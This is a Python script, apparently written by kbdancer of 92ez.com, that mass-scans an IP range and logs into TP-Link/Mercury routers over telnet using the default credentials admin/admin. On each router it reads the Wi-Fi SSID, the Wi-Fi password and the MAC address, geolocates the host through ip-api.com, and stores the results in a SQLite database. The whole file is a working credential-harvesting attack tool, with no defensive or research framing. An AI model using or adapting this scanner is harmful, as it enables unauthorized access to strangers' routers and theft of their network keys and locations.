#!/usr/bin/env python
# coding=utf-8
# code by kbdancer@92ez.com

from threading import Thread
from telnetlib import Telnet
import requests
import sqlite3
import queue
import time
import sys
import os


def ip2num(ip):
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]


def num2ip(num):
    return '%s.%s.%s.%s' % ((num & 0xff000000) >> 24, (num & 0x00ff0000) >> 16, (num & 0x0000ff00) >> 8, num & 0x000000ff)


def ip_range(start, end):
    return [num2ip(num) for num in range(ip2num(start), ip2num(end) + 1) if num & 0xff]


class Database:
    db = sys.path[0] + "/TPLINK_KEY.db"
    charset = 'utf8'

    def __init__(self):
        self.connection = sqlite3.connect(self.db)
        self.connection.text_factory = str
        self.cursor = self.connection.cursor()

    def insert(self, query, params):
        try:
            self.cursor.execute(query, params)
            self.connection.commit()
        except Exception as e:
            print(e)
            self.connection.rollback()

    def update(self, query, params):
        try:
            self.cursor.execute(query, params)
            self.connection.commit()
        except Exception as e:
            print(e)
            self.connection.rollback()

    def query(self, query, params):
        cursor = self.connection.cursor()
        cursor.execute(query, params)
        return cursor.fetchall()

    def __del__(self):
        self.connection.close()


def b_thread(ip_address_list):
    thread_list = []
    queue_list = queue.Queue()
    hosts = ip_address_list
    for host in hosts:
        queue_list.put(host)
    for x in range(0, int(sys.argv[1])):
        thread_list.append(tThread(queue_list))
    for t in thread_list:
        try:
            t.daemon = True
            t.start()
        except Exception as e:
            print(e)
    for t in thread_list:
        t.join()


class tThread(Thread):
    def __init__(self, queue_obj):
        Thread.__init__(self)
        self.queue = queue_obj

    def run(self):
        while not self.queue.empty():
            host = self.queue.get()
            try:
                getinfo(host)
            except Exception as e:
                print(e)
                continue


def get_position_by_ip(host):
    try:
        ip_url = "http://ip-api.com/json/{ip}?lang=zh-CN".format(ip=host)
        header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"}
        json_data = requests.get(url=ip_url, headers=header, timeout=10).json()
        info = [json_data.get("country"), json_data.get('regionName'), json_data.get('city'), json_data.get('isp')]
        return info
    except Exception as e:
        print(e)


def getinfo(host):
    username = "admin"
    password = "admin"
    telnet_timeout = 15
    cmd_timeout = 5

    try:
        t = Telnet(host, timeout=telnet_timeout)

        t.read_until("username:", cmd_timeout)
        t.write(username + "\n")
        t.read_until("password:", cmd_timeout)
        t.write(password + "\n")

        t.write("wlctl show\n")
        t.read_until("SSID", cmd_timeout)
        wifi_str = t.read_very_eager()

        t.write("lan show info\n")
        t.read_until("MACAddress", cmd_timeout)
        lan_str = t.read_very_eager()

        t.close()

        if len(wifi_str) > 0:
            # clear extra space
            wifi_str = "".join(wifi_str.split())
            wifi_str = wifi_str
            # get SID KEY MAC
            wifi_ssid = wifi_str[1:wifi_str.find('QSS')]
            wifi_key = wifi_str[wifi_str.find('Key=') + 4:wifi_str.find('cmd')] if wifi_str.find('Key=') != -1 else '无密码'
            router_mac = lan_str[1:lan_str.find('__')].replace('\r\n', '')
            current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))

            try:
                my_sqlite_db = Database()
                query_info = """select * from scanlog where ssid=? and key=?"""
                query_result = my_sqlite_db.query(query_info, [wifi_ssid, wifi_key])

                if len(query_result) < 1:

                    position_data = get_position_by_ip(host)
                    country = position_data[0]
                    province = position_data[1]
                    city = position_data[2]
                    isp = position_data[3]

                    insert_info = """INSERT INTO scanlog (`host`,`mac`,`ssid`,`wifikey`,`country`,`province`,`city`,`isp`) VALUES (?,?,?,?,?,?,?,?)"""

                    my_sqlite_db.insert(insert_info, [host, router_mac, wifi_ssid, wifi_key, country, province, city, isp])
                    print('[√] [%s] Info %s  %s  %s => Inserted!' % (current_time, host, wifi_ssid, wifi_key))
                else:
                    print('[x] [%s] Found %s  %s  %s in DB, do nothing!' % (current_time, host, wifi_ssid, wifi_key))
            except Exception as e:
                print(e)
    except Exception as e:
        print(e)


if __name__ == '__main__':
    
    print('==========================================')
    print(' Scan TPLINK(MERCURY) wifi key by telnet')
    print('           Author 92ez.com')
    print('==========================================')

    SET_THREAD = int(sys.argv[1])
    begin_ip = sys.argv[2].split('-')[0]
    end_ip = sys.argv[2].split('-')[1]
    ip_list = ip_range(begin_ip, end_ip)
    current_pid = os.getpid()

    print('\n[*] Total %d IP...' % len(ip_list))
    print('\n================ Running =================')

    try:
        b_thread(ip_list)
    except KeyboardInterrupt:
        print('\n[*] Kill all thread.')
        os.kill(current_pid, 9)
